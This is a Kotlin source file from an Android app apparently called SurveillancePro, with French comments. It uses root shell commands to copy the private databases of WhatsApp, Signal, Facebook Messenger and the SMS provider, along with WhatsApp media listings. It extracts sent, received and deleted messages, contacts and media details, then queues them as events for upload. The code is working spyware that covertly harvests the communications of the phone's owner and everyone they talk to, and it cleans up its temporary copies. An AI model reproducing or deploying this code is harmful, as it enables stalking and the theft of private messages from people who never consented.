package com.surveillancepro.android.root

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.util.Base64
import android.util.Log
import com.surveillancepro.android.data.EventQueue
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Extraction directe des bases de données de TOUTES les apps de messagerie (ROOT REQUIS).
 *
 * Avantage par rapport aux notifications :
 * - Messages envoyés ET reçus (les notifs ne montrent que les reçus)
 * - Messages supprimés par l'expéditeur ("Ce message a été supprimé")
 * - Messages vocaux avec durée exacte en secondes
 * - Photos/vidéos/documents avec métadonnées
 * - Noms réels des groupes et participants
 * - Historique complet, pas juste ce qui arrive en temps réel
 * - Statuts/stories WhatsApp
 * - Messages lus avant l'installation de notre app
 */
object DatabaseExtractor {

    private const val TAG = "DatabaseExtractor"
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)

    data class ExtractedMessage(
        val app: String,
        val sender: String,
        val message: String,
        val timestamp: Long,
        val isOutgoing: Boolean,
        val isMedia: Boolean,
        val mediaType: String?,
        val mediaDuration: Int,
        val mediaSize: Long,
        val groupName: String?,
        val isDeleted: Boolean,
        val isForwarded: Boolean,
        val quotedMessage: String?,
    )

    // ─── WHATSAPP ───────────────────────────────────────────────────────────────

    fun extractWhatsAppMessages(context: Context, sinceTimestamp: Long = 0): List<ExtractedMessage> {
        val messages = mutableListOf<ExtractedMessage>()
        val dbPath = copyAppDatabase("com.whatsapp", "databases/msgstore.db") ?: return messages

        try {
            val db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY)

            // Requête exhaustive sur la table message
            val cursor = db.rawQuery("""
                SELECT m.key_remote_jid, m.data, m.timestamp, m.key_from_me,
                       m.media_wa_type, m.media_duration, m.media_size,
                       m.forwarded, m.quoted_row_id, m.status,
                       (SELECT subject FROM jid WHERE raw_string = m.key_remote_jid LIMIT 1) as group_name,
                       (SELECT data FROM message WHERE _id = m.quoted_row_id LIMIT 1) as quoted_text
                FROM message m
                WHERE m.timestamp > ?
                ORDER BY m.timestamp DESC
                LIMIT 500
            """, arrayOf((sinceTimestamp * 1000).toString()))

            while (cursor.moveToNext()) {
                val jid = cursor.getString(0) ?: continue
                val data = cursor.getString(1) ?: ""
                val timestamp = cursor.getLong(2) / 1000
                val isFromMe = cursor.getInt(3) == 1
                val waMediaType = cursor.getInt(4)
                val mediaDuration = cursor.getInt(5)
                val mediaSize = cursor.getLong(6)
                val forwarded = cursor.getInt(7)
                val quotedRowId = cursor.getInt(8)
                val status = cursor.getInt(9)
                val groupName = cursor.getString(10)
                val quotedText = cursor.getString(11)

                val sender = if (jid.contains("@g.us")) {
                    groupName ?: jid.substringBefore("@")
                } else {
                    jid.substringBefore("@")
                }

                val mediaTypeStr = when (waMediaType) {
                    0 -> null
                    1 -> "image"
                    2 -> "audio"
                    3 -> "video"
                    4 -> "contact"
                    5 -> "location"
                    8 -> "audio_call"
                    9 -> "document"
                    10 -> "video_call"
                    13 -> "gif"
                    15 -> "sticker"
                    16 -> "live_location"
                    20 -> "voice_note"
                    else -> "media_$waMediaType"
                }

                // status 0 = lu, 5 = supprimé, 6 = supprimé par l'expéditeur
                val isDeleted = status == 5 || status == 6

                val displayMessage = when {
                    isDeleted && data.isBlank() -> "[Message supprimé]"
                    data.isNotBlank() -> data
                    mediaTypeStr == "voice_note" -> "🎤 Message vocal (${mediaDuration}s)"
                    mediaTypeStr == "audio" -> "🎵 Audio (${mediaDuration}s)"
                    mediaTypeStr == "audio_call" -> "📞 Appel vocal"
                    mediaTypeStr == "video_call" -> "📹 Appel vidéo"
                    mediaTypeStr == "image" -> "📷 Photo"
                    mediaTypeStr == "video" -> "🎬 Vidéo (${mediaDuration}s)"
                    mediaTypeStr == "sticker" -> "🏷️ Sticker"
                    mediaTypeStr == "gif" -> "🎞️ GIF"
                    mediaTypeStr == "location" -> "📍 Position"
                    mediaTypeStr == "live_location" -> "📍 Position en direct"
                    mediaTypeStr == "document" -> "📄 Document"
                    mediaTypeStr == "contact" -> "👤 Contact partagé"
                    mediaTypeStr != null -> mediaTypeStr
                    else -> ""
                }

                if (displayMessage.isBlank()) continue

                messages.add(ExtractedMessage(
                    app = "WhatsApp",
                    sender = sender,
                    message = displayMessage,
                    timestamp = timestamp,
                    isOutgoing = isFromMe,
                    isMedia = mediaTypeStr != null,
                    mediaType = mediaTypeStr,
                    mediaDuration = mediaDuration,
                    mediaSize = mediaSize,
                    groupName = groupName,
                    isDeleted = isDeleted,
                    isForwarded = forwarded > 0,
                    quotedMessage = quotedText?.take(200),
                ))
            }
            cursor.close()
            db.close()
        } catch (e: Exception) {
            Log.w(TAG, "WhatsApp extraction error: ${e.message}")
        } finally {
            File(dbPath).delete()
        }
        return messages
    }

    /**
     * Extrait la liste des contacts WhatsApp (noms, numéros, statuts "à propos").
     */
    fun extractWhatsAppContacts(context: Context): List<Map<String, String>> {
        val contacts = mutableListOf<Map<String, String>>()
        val dbPath = copyAppDatabase("com.whatsapp", "databases/wa.db") ?: return contacts

        try {
            val db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY)
            val cursor = db.rawQuery("""
                SELECT jid, display_name, status, number
                FROM wa_contacts
                WHERE is_whatsapp_user = 1
                ORDER BY display_name ASC
                LIMIT 1000
            """, null)

            while (cursor.moveToNext()) {
                val jid = cursor.getString(0) ?: continue
                val name = cursor.getString(1) ?: ""
                val status = cursor.getString(2) ?: ""
                val number = cursor.getString(3) ?: jid.substringBefore("@")

                contacts.add(mapOf(
                    "jid" to jid,
                    "name" to name,
                    "status" to status,
                    "number" to number,
                ))
            }
            cursor.close()
            db.close()
        } catch (e: Exception) {
            Log.w(TAG, "WhatsApp contacts error: ${e.message}")
        } finally {
            File(dbPath).delete()
        }
        return contacts
    }

    // ─── SIGNAL ─────────────────────────────────────────────────────────────────

    fun extractSignalMessages(context: Context, sinceTimestamp: Long = 0): List<ExtractedMessage> {
        val messages = mutableListOf<ExtractedMessage>()
        val dbPath = copyAppDatabase("org.thoughtcrime.securesms", "databases/signal.db")
            ?: return messages

        try {
            val db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY)
            val cursor = db.rawQuery("""
                SELECT m.body, m.date_sent, m.date_received, m.type,
                       m.thread_id, m.msg_box,
                       (SELECT r.system_display_name FROM recipient r
                        JOIN thread t ON t.recipient_id = r._id
                        WHERE t._id = m.thread_id LIMIT 1) as contact_name
                FROM message m
                WHERE m.date_received > ?
                ORDER BY m.date_received DESC
                LIMIT 300
            """, arrayOf((sinceTimestamp * 1000).toString()))

            while (cursor.moveToNext()) {
                val body = cursor.getString(0) ?: ""
                val dateSent = cursor.getLong(1) / 1000
                val dateReceived = cursor.getLong(2) / 1000
                val type = cursor.getInt(3)
                val threadId = cursor.getLong(4)
                val msgBox = cursor.getInt(5)
                val contactName = cursor.getString(6) ?: "Contact Signal"

                val isOutgoing = (type and 0x1F) == 23 || (type and 0x1F) == 24

                if (body.isBlank()) continue

                messages.add(ExtractedMessage(
                    app = "Signal",
                    sender = contactName,
                    message = body,
                    timestamp = dateReceived,
                    isOutgoing = isOutgoing,
                    isMedia = false,
                    mediaType = null,
                    mediaDuration = 0,
                    mediaSize = 0,
                    groupName = null,
                    isDeleted = false,
                    isForwarded = false,
                    quotedMessage = null,
                ))
            }
            cursor.close()
            db.close()
        } catch (e: Exception) {
            Log.w(TAG, "Signal extraction error: ${e.message}")
        } finally {
            File(dbPath).delete()
        }
        return messages
    }

    // ─── FACEBOOK MESSENGER ────────────────────────────────────────────────────

    fun extractMessengerMessages(context: Context, sinceTimestamp: Long = 0): List<ExtractedMessage> {
        val messages = mutableListOf<ExtractedMessage>()

        // Messenger utilise plusieurs fichiers DB possibles
        val dbNames = listOf("threads_db2", "threads_db2-journal", "nux_db")
        var dbPath: String? = null
        for (name in dbNames) {
            dbPath = copyAppDatabase("com.facebook.orca", "databases/$name")
            if (dbPath != null) break
        }
        if (dbPath == null) return messages

        try {
            val db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY)
            val cursor = db.rawQuery("""
                SELECT m.text, m.timestamp_ms, m.sender,
                       m.thread_key, m.msg_type
                FROM messages m
                WHERE m.timestamp_ms > ?
                ORDER BY m.timestamp_ms DESC
                LIMIT 300
            """, arrayOf((sinceTimestamp * 1000).toString()))

            while (cursor.moveToNext()) {
                val text = cursor.getString(0) ?: ""
                val timestampMs = cursor.getLong(1)
                val sender = cursor.getString(2) ?: ""
                val threadKey = cursor.getString(3) ?: ""
                val msgType = cursor.getInt(4)

                if (text.isBlank()) continue

                messages.add(ExtractedMessage(
                    app = "Messenger",
                    sender = sender,
                    message = text,
                    timestamp = timestampMs / 1000,
                    isOutgoing = false,
                    isMedia = msgType != 0,
                    mediaType = if (msgType != 0) "media" else null,
                    mediaDuration = 0,
                    mediaSize = 0,
                    groupName = if (threadKey.contains("group")) threadKey else null,
                    isDeleted = false,
                    isForwarded = false,
                    quotedMessage = null,
                ))
            }
            cursor.close()
            db.close()
        } catch (e: Exception) {
            Log.w(TAG, "Messenger extraction error: ${e.message}")
        } finally {
            File(dbPath).delete()
        }
        return messages
    }

    // ─── SMS (DATABASE BRUTE) ──────────────────────────────────────────────────

    fun extractSMSDatabase(context: Context, sinceTimestamp: Long = 0): List<ExtractedMessage> {
        val messages = mutableListOf<ExtractedMessage>()
        val dbPath = copyAppDatabase("com.android.providers.telephony", "databases/mmssms.db")
            ?: return messages

        try {
            val db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY)
            val cursor = db.rawQuery("""
                SELECT address, body, date, type, read, seen, thread_id
                FROM sms
                WHERE date > ?
                ORDER BY date DESC LIMIT 300
            """, arrayOf((sinceTimestamp * 1000).toString()))

            while (cursor.moveToNext()) {
                val address = cursor.getString(0) ?: continue
                val body = cursor.getString(1) ?: ""
                val date = cursor.getLong(2) / 1000
                val type = cursor.getInt(3)
                val read = cursor.getInt(4)

                if (body.isBlank()) continue

                messages.add(ExtractedMessage(
                    app = "SMS",
                    sender = address,
                    message = body,
                    timestamp = date,
                    isOutgoing = type == 2,
                    isMedia = false,
                    mediaType = null,
                    mediaDuration = 0,
                    mediaSize = 0,
                    groupName = null,
                    isDeleted = false,
                    isForwarded = false,
                    quotedMessage = null,
                ))
            }
            cursor.close()
            db.close()
        } catch (e: Exception) {
            Log.w(TAG, "SMS DB extraction error: ${e.message}")
        } finally {
            File(dbPath).delete()
        }
        return messages
    }

    // ─── WHATSAPP MEDIA FILES ──────────────────────────────────────────────────

    /**
     * Liste les fichiers media récents de WhatsApp (images envoyées/reçues).
     */
    fun extractWhatsAppRecentMedia(): List<Map<String, Any>> {
        val media = mutableListOf<Map<String, Any>>()
        val dirs = listOf(
            "/data/media/0/WhatsApp/Media/WhatsApp Images",
            "/data/media/0/WhatsApp/Media/WhatsApp Video",
            "/data/media/0/WhatsApp/Media/WhatsApp Voice Notes",
            "/data/media/0/WhatsApp/Media/WhatsApp Documents",
            "/sdcard/WhatsApp/Media/WhatsApp Images",
            "/sdcard/WhatsApp/Media/WhatsApp Video",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
        )

        for (dir in dirs) {
            val result = RootManager.executeRootCommand(
                "find '$dir' -type f -newer /data/local/tmp/.sp_media_marker 2>/dev/null | head -20"
            )
            if (!result.success) continue

            for (filePath in result.output.lines().filter { it.isNotBlank() }) {
                val name = filePath.substringAfterLast("/")
                val sizeResult = RootManager.executeRootCommand("stat -c '%s' '$filePath' 2>/dev/null")
                val size = sizeResult.output.trim().toLongOrNull() ?: 0

                val type = when {
                    name.endsWith(".jpg", true) || name.endsWith(".jpeg", true) -> "image"
                    name.endsWith(".mp4", true) || name.endsWith(".3gp", true) -> "video"
                    name.endsWith(".opus", true) || name.endsWith(".ogg", true) -> "voice_note"
                    name.endsWith(".pdf", true) -> "document"
                    else -> "file"
                }

                val isSent = filePath.contains("/Sent/")

                media.add(mapOf(
                    "path" to filePath,
                    "filename" to name,
                    "sizeBytes" to size,
                    "type" to type,
                    "isSent" to isSent,
                    "app" to "WhatsApp",
                ))
            }
        }

        // Mettre à jour le marqueur temporel
        RootManager.executeRootCommand("touch /data/local/tmp/.sp_media_marker")

        return media
    }

    // ─── EXTRACTION COMPLETE ───────────────────────────────────────────────────

    fun extractAllAndEnqueue(context: Context) {
        if (!RootManager.isRooted()) return

        val prefs = context.getSharedPreferences("sp_root_extract", Context.MODE_PRIVATE)
        val lastExtract = prefs.getLong("last_extract", 0L)
        val queue = EventQueue.getInstance(context)
        val now = System.currentTimeMillis() / 1000

        var totalMessages = 0

        // WhatsApp messages
        try {
            val waMessages = extractWhatsAppMessages(context, lastExtract)
            enqueueMessages(queue, waMessages)
            totalMessages += waMessages.size
        } catch (_: Exception) {}

        // WhatsApp contacts (une fois par jour)
        val lastContactSync = prefs.getLong("last_wa_contacts_sync", 0L)
        if (now - lastContactSync > 86400) {
            try {
                val waContacts = extractWhatsAppContacts(context)
                if (waContacts.isNotEmpty()) {
                    queue.enqueue("whatsapp_contacts", mapOf(
                        "contacts" to waContacts,
                        "count" to waContacts.size,
                        "timestamp" to dateFormat.format(Date()),
                        "source" to "root_db",
                    ))
                    prefs.edit().putLong("last_wa_contacts_sync", now).apply()
                }
            } catch (_: Exception) {}
        }

        // WhatsApp media récents
        try {
            val waMedia = extractWhatsAppRecentMedia()
            if (waMedia.isNotEmpty()) {
                queue.enqueue("whatsapp_media_files", mapOf(
                    "files" to waMedia,
                    "count" to waMedia.size,
                    "timestamp" to dateFormat.format(Date()),
                    "source" to "root_fs",
                ))
            }
        } catch (_: Exception) {}

        // Signal
        try {
            val signalMsgs = extractSignalMessages(context, lastExtract)
            enqueueMessages(queue, signalMsgs)
            totalMessages += signalMsgs.size
        } catch (_: Exception) {}

        // Messenger
        try {
            val messengerMsgs = extractMessengerMessages(context, lastExtract)
            enqueueMessages(queue, messengerMsgs)
            totalMessages += messengerMsgs.size
        } catch (_: Exception) {}

        // SMS (root = capture les supprimés aussi)
        try {
            val smsMsgs = extractSMSDatabase(context, lastExtract)
            enqueueMessages(queue, smsMsgs)
            totalMessages += smsMsgs.size
        } catch (_: Exception) {}

        if (totalMessages > 0) {
            Log.d(TAG, "Root extraction: $totalMessages messages from all apps")
            prefs.edit().putLong("last_extract", now).apply()
        }
    }

    private fun enqueueMessages(queue: EventQueue, messages: List<ExtractedMessage>) {
        for (msg in messages) {
            val payload = mutableMapOf<String, Any>(
                "app" to msg.app,
                "sender" to msg.sender,
                "message" to msg.message.take(3000),
                "isOutgoing" to msg.isOutgoing,
                "isMedia" to msg.isMedia,
                "mediaType" to (msg.mediaType ?: ""),
                "mediaDuration" to msg.mediaDuration,
                "groupName" to (msg.groupName ?: ""),
                "isDeleted" to msg.isDeleted,
                "isForwarded" to msg.isForwarded,
                "messageTimestamp" to dateFormat.format(Date(msg.timestamp * 1000)),
                "timestamp" to dateFormat.format(Date()),
                "source" to "root_db",
            )
            if (msg.quotedMessage != null) payload["quotedMessage"] = msg.quotedMessage
            if (msg.mediaSize > 0) payload["mediaSize"] = msg.mediaSize

            queue.enqueue("root_message", payload)
        }
    }

    private fun copyAppDatabase(packageName: String, dbRelativePath: String): String? {
        val tmpFile = "/data/local/tmp/sp_db_${System.currentTimeMillis()}.db"
        val srcPath = "/data/data/$packageName/$dbRelativePath"

        val result = RootManager.executeRootCommand(
            "cp '$srcPath' '$tmpFile' 2>/dev/null && chmod 644 '$tmpFile'"
        )
        if (!result.success || !File(tmpFile).exists()) return null
        return tmpFile
    }
}
